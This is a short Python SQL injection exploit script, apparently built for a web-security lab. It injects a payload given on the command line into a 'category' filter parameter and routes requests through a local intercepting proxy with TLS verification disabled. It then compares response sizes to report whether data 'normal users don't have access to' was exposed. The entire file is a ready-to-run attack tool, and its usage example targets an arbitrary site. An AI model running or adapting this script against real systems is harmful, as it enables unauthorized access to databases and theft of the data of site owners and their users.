import requests
import urllib3
import sys

proxies = {
    "http": "http://127.0.0.1:8080",
    "http": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli(url,payload):
    print("(+) Exploiting in progress...")
    path_to_vulnerable_parameter = "filter?category='"
    legimite_response_size = requests.get(url , verify=False, proxies=proxies).text
    exploitation_response = requests.get(url +path_to_vulnerable_parameter + payload , verify=False, proxies=proxies).text
    print(f"(+) Size of legimate request = {len(legimite_response_size)}"  )
    print(f"(+) Size of Exploitation request = {len(exploitation_response)}"  )

    print(f"(+) Size of content  normal user don't have access to  = {len(exploitation_response) - len(legimite_response_size)}"  )
    

    if len(exploitation_response) > len(legimite_response_size):
        return True
    else:
        return False

if __name__ == "__main__":
    # main()

    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2]#.strip()
    except IndexError:
        print("(-) Usage: %s <url> <payload>" % sys.argv[0])
        print("(-) Example: %s https://www.random.com '1=1' " % sys.argv[0])
        sys.exit(-1)
    if exploit_sqli(url,payload):
        print("(+) Exploitation Done Successfully")
    else:
        print("(-) Exploitation didn't work")